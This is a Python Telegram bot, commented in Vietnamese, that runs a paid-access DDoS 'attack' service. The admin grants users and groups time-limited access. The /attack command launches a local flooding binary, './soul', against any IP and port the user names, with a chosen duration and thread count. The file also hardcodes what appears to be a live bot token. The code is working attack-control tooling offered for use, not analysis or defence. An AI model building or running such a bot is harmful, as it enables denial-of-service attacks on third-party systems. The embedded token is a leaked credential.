import telebot
import subprocess
import threading
import psutil
import os
import time
from datetime import datetime, timedelta

# Cấu hình bot
TOKEN = "7656031517:AAFSYcm8x17xafPqA1d9Gl0u-znGVnjkkFU"  # Thay thế bằng Token của bạn
ADMIN_ID = 7088683094      # ID Admin (người duy nhất có quyền thêm user/group)
bot = telebot.TeleBot(TOKEN)

# Biến lưu user/group được phép sử dụng
allowed_users = {}  # {user_id: expiry_date}
allowed_groups = {}  # {group_id: expiry_date}
running_attacks = {}

# Hàm đọc dữ liệu từ file khi khởi động bot
def load_data():
    global allowed_users, allowed_groups
    allowed_users.clear()
    allowed_groups.clear()

    if os.path.exists("users.txt"):
        with open("users.txt", "r") as f:
            for line in f:
                user_id, expiry_date = line.strip().split(",")
                allowed_users[int(user_id)] = datetime.strptime(expiry_date, "%Y-%m-%d %H:%M:%S")

    if os.path.exists("groups.txt"):
        with open("groups.txt", "r") as f:
            for line in f:
                group_id, expiry_date = line.strip().split(",")
                allowed_groups[int(group_id)] = datetime.strptime(expiry_date, "%Y-%m-%d %H:%M:%S")

# Hàm lưu user/group vào file
def save_data():
    with open("users.txt", "w") as f:
        for user_id, expiry_date in allowed_users.items():
            f.write(f"{user_id},{expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")

    with open("groups.txt", "w") as f:
        for group_id, expiry_date in allowed_groups.items():
            f.write(f"{group_id},{expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")

# Hàm kiểm tra & xóa user/group hết hạn
def remove_expired():
    now = datetime.now()
    expired_users = [uid for uid, exp in allowed_users.items() if exp < now]
    expired_groups = [gid for gid, exp in allowed_groups.items() if exp < now]

    for uid in expired_users:
        del allowed_users[uid]
    for gid in expired_groups:
        del allowed_groups[gid]

    save_data()

# Chạy kiểm tra mỗi 10 phút
def start_cleaner():
    while True:
        remove_expired()
        time.sleep(600)  # Kiểm tra mỗi 10 phút

threading.Thread(target=start_cleaner, daemon=True).start()
load_data()  # Load dữ liệu khi bot khởi động

# Kiểm tra quyền user/group
def is_allowed(user_id, chat_id):
    return user_id in allowed_users or chat_id in allowed_groups

# Lệnh thêm user
@bot.message_handler(commands=['add_user'])
def add_user(message):
    if message.chat.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(ADMIN_ID, "❌ Định dạng: /add_user <user_id> <số ngày>")
        return
    
    user_id, days = int(args[1]), int(args[2])
    expiry_date = datetime.now() + timedelta(days=days)
    allowed_users[user_id] = expiry_date
    save_data()
    bot.send_message(ADMIN_ID, f"✅ Đã thêm user {user_id} trong {days} ngày!")

# Lệnh thêm group
@bot.message_handler(commands=['add_group'])
def add_group(message):
    if message.chat.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(ADMIN_ID, "❌ Định dạng: /add_group <group_id> <số ngày>")
        return
    
    group_id, days = int(args[1]), int(args[2])
    expiry_date = datetime.now() + timedelta(days=days)
    allowed_groups[group_id] = expiry_date
    save_data()
    bot.send_message(ADMIN_ID, f"✅ Đã thêm group {group_id} trong {days} ngày!")

# Lệnh kiểm tra danh sách user
@bot.message_handler(commands=['list_users'])
def list_users(message):
    if message.chat.id != ADMIN_ID:
        return
    users = "\n".join([f"🔹 {uid} (Hết hạn: {exp.strftime('%Y-%m-%d %H:%M:%S')})" for uid, exp in allowed_users.items()])
    bot.send_message(ADMIN_ID, f"📋 **Danh sách Users:**\n{users}" if users else "❌ Không có user nào!")

# Lệnh kiểm tra danh sách group
@bot.message_handler(commands=['list_groups'])
def list_groups(message):
    if message.chat.id != ADMIN_ID:
        return
    groups = "\n".join([f"🔹 {gid} (Hết hạn: {exp.strftime('%Y-%m-%d %H:%M:%S')})" for gid, exp in allowed_groups.items()])
    bot.send_message(ADMIN_ID, f"📋 **Danh sách Groups:**\n{groups}" if groups else "❌ Không có group nào!")

# Lệnh attack
@bot.message_handler(commands=['attack'])
def run_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_allowed(user_id, chat_id):
        bot.send_message(chat_id, "❌ Bạn không có quyền sử dụng lệnh này!")
        return

    args = message.text.split()
    if len(args) != 5:
        bot.send_message(chat_id, "❌ Định dạng: /attack <IP> <port> <time> <threads>")
        return
    
    ip, port, duration, threads = args[1], args[2], args[3], args[4]
    try:
        process = subprocess.Popen(["./soul", ip, port, duration, threads], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        running_attacks[process.pid] = process
        bot.send_message(chat_id, f"🚀 **Tấn công đã bắt đầu!**\n🔹 IP: `{ip}`\n🔹 Port: `{port}`\n🔹 Thời gian: `{duration}` giây\n🔹 Luồng: `{threads}`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Lỗi khi chạy attack: {str(e)}")

# Lệnh status
@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_allowed(user_id, chat_id):
        bot.send_message(chat_id, "❌ Bạn không có quyền sử dụng lệnh này!")
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    uptime = time.time() - psutil.boot_time()
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))

    status_message = (f"📊 **Trạng thái hệ thống**\n"
                      f"🔹 CPU: {cpu_usage}%\n"
                      f"🔹 RAM: {ram_usage}%\n"
                      f"🔹 Uptime: {uptime_str}")
    bot.send_message(chat_id, status_message)

# Chạy bot
while True:
    try:
        bot.polling(none_stop=True, timeout=60)
    except Exception as e:
        print(f"Lỗi: {e}")
        time.sleep(5)
